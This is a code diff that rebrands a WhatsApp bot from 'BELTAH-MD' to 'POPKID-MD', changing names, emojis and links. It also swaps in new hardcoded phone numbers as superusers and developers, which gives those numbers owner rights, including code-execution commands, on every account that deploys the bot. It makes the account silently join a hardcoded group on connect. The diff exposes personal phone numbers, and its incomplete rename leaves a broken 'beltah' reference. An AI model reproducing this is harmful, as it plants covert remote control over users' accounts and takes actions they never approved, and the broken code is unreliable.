@@ -96,7 +96,7 @@ const {
 let {
   reagir
 } = require(__dirname + "/keizzah/app");
-var session = conf.session.replace(/BELTAH-MD;;;=>/g, "");
+var session = conf.session.replace(/POPKID-MD;;;=>/g, "");
 const prefixe = conf.PREFIXE || [];
 
 require('dotenv').config({
@@ -143,7 +143,7 @@ setTimeout(() => {
       logger: pino({
         level: "silent"
       }),
-      browser: ['BELTAH-MD', "safari", "1.0.0"],
+      browser: ['POPKID-MD', "safari", "1.0.0"],
       printQRInTerminal: true,
       fireInitQueries: false,
       shouldSyncHistoryMessage: true,
@@ -268,7 +268,7 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
                 }
 
                 // Check if bot user ID is available
-                const beltah = zk.user && zk.user.id ? zk.user.id.split(":")[0] + "@s.whatsapp.net" : null;
+                const popkid = zk.user && zk.user.id ? zk.user.id.split(":")[0] + "@s.whatsapp.net" : null;
                 if (!beltah) {
                     console.log("Bot's user ID not available. Skipping reaction.");
                     continue;
@@ -307,7 +307,7 @@ if (conf.AUTOBIO === 'yes') {
     setInterval(() => {
       const date = new Date();
       zk.updateProfileStatus(
-        `👻 ${conf.BOT} 👻 || 𝐃𝐚𝐭𝐞: ${date.toLocaleString('en-US' , { timeZone: 'Africa/Nairobi' })} || 𝐃𝐚𝐲: ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
+        `🩷 ${conf.BOT} 🩷 || 𝐃𝐚𝐭𝐞: ${date.toLocaleString('en-US' , { timeZone: 'Africa/Nairobi' })} || 𝐃𝐚𝐲: ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
       );
     }, 10 * 1000);
   }
@@ -358,9 +358,9 @@ zk.ev.on("messages.upsert", async (m) => {
     // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  return `*『 👻 ${conf.BOT} ᴀɴᴛɪᴅᴇʟᴇᴛᴇ 👻 』*\n\n` +
+  return `*『 🩷 ${conf.BOT} ᴀɴᴛɪᴅᴇʟᴇᴛᴇ 🩷 』*\n\n` +
     `*ᴅᴇʟᴇᴛɪᴏɴ ᴛɪᴍᴇ:* ${new Date().toLocaleString()}\n` +
-    `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ:* @${deletedBy.split('@')[0]}\n\n> ᴅᴇʟᴇᴛᴇᴅ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʀᴇᴛʀɪᴇᴠᴇᴅ ʙʏ ʙᴇʟᴛᴀʜ-ᴍᴅ`;
+    `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ:* @${deletedBy.split('@')[0]}\n\n> ᴅᴇʟᴇᴛᴇᴅ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʀᴇᴛʀɪᴇᴠᴇᴅ ʙʏ ᴘᴏᴘᴋɪᴅ-ᴍᴅ`;
 }
 // Helper function to download media based on message type
 async function downloadMessageMedia(message) {
@@ -521,10 +521,10 @@ zk.ev.on("messages.upsert", async m => {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254737681758", '254114141192',"254738625827","254759328581", conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254732297194", '254111385747',"254732297194","254111385747", conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254114141192',"254737681758","254759328581",'254738625827'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254111385747',"254732297194","254732297194",'254756466053'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -532,7 +532,7 @@ zk.ev.on("messages.upsert", async m => {
           quoted: ms
         });
       }
-      console.log("\t [][]...{Beltah-Md}...[][]");
+      console.log("\t [][]...{Popkid-Md}...[][]");
       console.log("=========== New message ===========");
       if (verifGroupe) {
         console.log("message sent from : " + nomGroupe);
@@ -625,13 +625,13 @@ zk.ev.on("messages.upsert", async m => {
           }
         });
       }
-//BELTAH MD DID EVERYTHING ,,,DO NOT COPY ...
+//POPKID MD DID EVERYTHING ,,,DO NOT COPY ...
 if (!superUser && origineMessage  === auteurMessage && conf.AUTO_REACT === "yes") {
 const emojis = ['👣', '🏗️', '✈️', '🌽', '🏸', '🛖', '🍁', '🛰️', '🥔', '🎡', '🎸', '🎼', '🔉', '📿', '🪇', '📹', '🎞️', '🪔', '📔', '🏷️', '💰', '📥', '🗳️', '📭', '🖌️', '📏', '', '🪛', '🔨', '⛓️‍💥', '📌', '🗝️', '🔍', '🥁', '🔊', '🥾', '👢', '🩰', '👡', '🙂', '🎊', '🎉', '🎁', '⛑️', '👋']
-         const beltahs = emojis[Math.floor(Math.random() * (emojis.length))]
+         const popkids = emojis[Math.floor(Math.random() * (emojis.length))]
          zk.sendMessage(origineMessage, {
              react: {
-                 text: beltahs,
+                 text: popkids,
                  key: ms.key
              }
          })
@@ -808,7 +808,7 @@ if (badWords.some(word => texte.includes(word)) && !superUser && origineMessage 
     //development part
       if (texte && texte.startsWith('<')) {
   if (!superUser) {
-    return repondre("Only for my owner or Beltah Tech to execute this command 🚫");
+    return repondre("Only for my owner or Popkid Tech to execute this command 🩷");
   }
   
   try { 
@@ -825,16 +825,16 @@ if (badWords.some(word => texte.includes(word)) && !superUser && origineMessage 
 if (texte && texte.startsWith('>')) {
   // If the sender is not the owner
   if (!superUser) {
-    const menuText = `This command is only for the owner or Beltah to execute 🚫`;
+    const menuText = `This command is only for the owner or Popkid to execute 🩷`;
 
     await zk.sendMessage(origineMessage, {
       text: menuText,
       contextInfo: {
         externalAdReply: {
-          title: "𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃" ,
-          body: "POWERED BY BELTAH HACKING TEAM",
-          sourceUrl: "https://whatsapp.com/channel/0029VaRHDBKKmCPKp9B2uH2F" ,
-          thumbnailUrl: "https://telegra.ph/file/dcce2ddee6cc7597c859a.jpg" || conf.BOT_MENU_LINK,
+          title: "𝐏𝐎𝐏𝐊𝐈𝐃 𝐌𝐃" ,
+          body: "POWERED BY POPKID XTECH TEAM",
+          sourceUrl: "https://whatsapp.com/channel/0029VadQrNI8KMqo79BiHr3l" ,
+          thumbnailUrl: "https://files.catbox.moe/nk71o3.jpg" || conf.BOT_MENU_LINK,
           mediaType: 1,
           showAdAttribution: true,
           renderLargerThumbnail: false
@@ -868,7 +868,7 @@ if (texte && texte.startsWith('>')) {
   
   await zk.sendMessage(user, { 
     text: text,
-    react: { text: '👻', key: ms.key }
+    react: { text: '❤️', key: ms.key }
   }, { quoted: ms });
                        }
 
@@ -1100,7 +1100,7 @@ if (texte && texte.startsWith('>')) {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'BELTAH-MD',
+                pack: 'POPKID-MD',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -1182,7 +1182,7 @@ if (texte && texte.startsWith('>')) {
             /******************* PM_PERMT***************/
 
             if (!superUser && origineMessage === auteurMessage && conf.PM_PERMIT === "yes") {
-              repondre("ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ ❗❗\n\n> ʏᴏᴜ ʜᴀᴠᴇ ɴᴏ ᴀᴄᴄᴇss ᴏғ ʙᴇʟᴛᴀʜ-ᴍᴅ ɪɴ ᴘᴍ.");
+              repondre("ᴇʀʀᴏʀ🚫!! ʏᴏᴜ ʜᴀᴠᴇ ɴᴏ ᴀᴄᴄᴇss ᴏғ ᴘᴏᴘᴋɪᴅ-ᴍᴅ ɪɴ ᴘᴍ.");
               return;
             }
             ///////////////////////////////
@@ -1244,7 +1244,7 @@ if (texte && texte.startsWith('>')) {
       try {
         const metadata = await zk.groupMetadata(group.id);
         if (group.action == 'add' && (await recupevents(group.id, "welcome")) == 'on') {
-          let msg = `𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃\n\n👋 Hello
+          let msg = `𝐏𝐎𝐏𝐊𝐈𝐃 𝐌𝐃\n\n👋 Hello
 `;
           let membres = group.participants;
           for (let membre of membres) {
@@ -1370,11 +1370,11 @@ if (texte && texte.startsWith('>')) {
         connection
       } = con;
       if (connection === "connecting") {
-        console.log("ℹ️ Beltah md connecting in your account...");
+        console.log("ℹ️ Popkid md connecting in your account...");
       } else if (connection === 'open') {
-        await zk.newsletterFollow("120363249464136503@newsletter");
+        await zk.groupAcceptInvite("F9eGks0Pnw7JJrozICzBo4");
         
-         console.log("✅ Beltah Md connected successfully✔");
+         console.log("✅ Popkid Md connected successfully✔");
         console.log("--");
         0;
         await baileys_1.delay(200);
@@ -1382,14 +1382,14 @@ if (texte && texte.startsWith('>')) {
         0;
         await baileys_1.delay(300);
         console.log("------------------/-----");
-        console.log(" Beltah-md installing all plugins😇\n\n");
+        console.log(" Popkid-md installing all plugins😇\n\n");
         //chargement des commandes 
         console.log("chargement des commands ...\n");
         fs.readdirSync(__dirname + "/commands").forEach(fichier => {
           if (path.extname(fichier).toLowerCase() == ".js") {
             try {
               require(__dirname + "/commands/" + fichier);
-              console.log(fichier + "Successfully installed Beltah Md commands✔️");
+              console.log(fichier + "Successfully installed Popkid Md commands✔️");
             } catch (e) {
               console.log(`${fichier} n'a pas pu être chargé pour les raisons suivantes : ${e}`);
             } /* require(__dirname + "/commands/" + fichier);
@@ -1408,7 +1408,7 @@ if (texte && texte.startsWith('>')) {
         } else {
           md = "undefined";
         }
-        console.log("Beltah md successfully connected✅");
+        console.log("Popkid md successfully connected✅");
         await activateCrons();
                 const date = new Date();
                 const formattedDate = date.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', timeZone: conf.TIMEZONE });
@@ -1436,14 +1436,14 @@ if (texte && texte.startsWith('>')) {
           await zk.sendMessage(zk.user.id, {
             text: `               
 ╭━❮ *${conf.BOT}* ❯━╮     
-┃✰╭───────────
-┃✰┃ Owner : *${conf.OWNER_NAME}*
-┃✰┃ Prefix : [ ${prefixe} ]
-┃✰┃ Mode :${md}
-┃✰┃ Time : ${formattedTime}
-┃✰┃ Day : ${formattedDate} 
-┃✰┃ Commands : ${evt.cm.length}
-┃✰╰────────────︎
+┃✞︎╭───────────
+┃✞︎┃ Owner : *${conf.OWNER_NAME}*
+┃✞︎┃ Prefix : [ ${prefixe} ]
+┃✞︎┃ Mode :${md}
+┃✞︎┃ Time : ${formattedTime}
+┃✞︎┃ Day : ${formattedDate} 
+┃✞︎┃ Commands : ${evt.cm.length}
+┃✞︎╰────────────︎
 ╰═════════════════⊷
 > *${getGreeting()}*
 
@@ -1461,7 +1461,7 @@ if (texte && texte.startsWith('>')) {
           console.log('!!! connexion fermée, reconnexion en cours ...');
           main();
         } else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionLost) {
-          console.log('connection error😞 ,,Beltah trying to reconnect... ');
+          console.log('connection error😞 ,,popkid trying to reconnect... ');
           main();
         } else if (raisonDeconnexion === baileys_1.DisconnectReason?.connectionReplaced) {
           console.log('connexion réplacée ,,, une sesssion est déjà ouverte veuillez la fermer svp !!!');
